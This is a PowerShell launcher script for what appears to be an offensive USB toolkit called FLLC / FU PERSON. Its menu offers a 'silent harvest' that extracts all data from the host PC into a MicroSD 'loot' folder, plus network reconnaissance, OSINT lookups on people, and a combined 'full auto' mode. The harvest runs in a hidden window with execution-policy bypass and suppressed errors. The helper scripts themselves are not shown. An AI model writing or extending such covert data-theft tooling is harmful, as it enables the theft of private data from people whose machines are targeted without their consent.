<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | MASTER LAUNCHER v2.0
   One script to rule them all. Run from USB or anywhere.
═══════════════════════════════════════════════════════════════════════ #>

$ErrorActionPreference = 'SilentlyContinue'
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition

function Show-Banner {
    Write-Host @"

    ███████╗██╗   ██╗    ██████╗ ███████╗██████╗ ███████╗ ██████╗ ███╗   ██╗
    ██╔════╝██║   ██║    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗████╗  ██║
    █████╗  ██║   ██║    ██████╔╝█████╗  ██████╔╝███████╗██║   ██║██╔██╗ ██║
    ██╔══╝  ██║   ██║    ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║   ██║██║╚██╗██║
    ██║     ╚██████╔╝    ██║     ███████╗██║  ██║███████║╚██████╔╝██║ ╚████║
    ╚═╝      ╚═════╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝

                    FLLC Operations Platform v2.0
                    Pure PowerShell | Zero Dependencies
"@ -ForegroundColor Cyan
}

function Show-Menu {
    while ($true) {
        Show-Banner
        Write-Host @"
    ================================================
     [1] SILENT HARVEST     — Extract all data from this PC (auto, hidden)
     [2] NETWORK RECON      — Ports, hosts, WiFi, shares (interactive)
     [3] OSINT TOOLKIT      — People, phone, email, domain, IP lookup
     [4] FULL AUTO           — Silent harvest + network recon (background)
     [0] EXIT
    ================================================
"@ -ForegroundColor Yellow
        
        $choice = Read-Host "    Select"
        
        switch ($choice) {
            "1" {
                Write-Host "`n    [*] Launching silent harvest..." -ForegroundColor Cyan
                $harvestPath = Join-Path $scriptDir "harvest.ps1"
                if (Test-Path $harvestPath) {
                    Start-Process powershell.exe -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -File `"$harvestPath`"" -WindowStyle Hidden
                    Write-Host "    [+] Harvest running in background. Data dumps to MicroSD." -ForegroundColor Green
                    Write-Host "    [+] Check loot\ folder on MicroSD when complete (~60s)" -ForegroundColor Green
                } else {
                    Write-Host "    [!] harvest.ps1 not found at: $harvestPath" -ForegroundColor Red
                }
            }
            "2" {
                $reconPath = Join-Path $scriptDir "recon.ps1"
                if (Test-Path $reconPath) {
                    . $reconPath
                    Show-ReconMenu
                } else {
                    Write-Host "    [!] recon.ps1 not found" -ForegroundColor Red
                }
            }
            "3" {
                $osintPath = Join-Path $scriptDir "osint.ps1"
                if (Test-Path $osintPath) {
                    . $osintPath
                    Show-OsintMenu
                } else {
                    Write-Host "    [!] osint.ps1 not found" -ForegroundColor Red
                }
            }
            "4" {
                Write-Host "`n    [*] FULL AUTO MODE" -ForegroundColor Cyan
                Write-Host "    [*] Starting silent harvest in background..." -ForegroundColor DarkGray
                $harvestPath = Join-Path $scriptDir "harvest.ps1"
                if (Test-Path $harvestPath) {
                    Start-Process powershell.exe -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -File `"$harvestPath`"" -WindowStyle Hidden
                    Write-Host "    [+] Harvest running" -ForegroundColor Green
                }
                
                Write-Host "    [*] Starting network recon..." -ForegroundColor DarkGray
                $reconPath = Join-Path $scriptDir "recon.ps1"
                if (Test-Path $reconPath) {
                    . $reconPath
                    Run-FullRecon
                }
                
                Write-Host "`n    [+] Full auto complete." -ForegroundColor Green
            }
            "0" {
                Write-Host "`n    FLLC out.`n" -ForegroundColor DarkGray
                return
            }
            default { Write-Host "    Invalid selection" -ForegroundColor Red }
        }
    }
}

Show-Menu
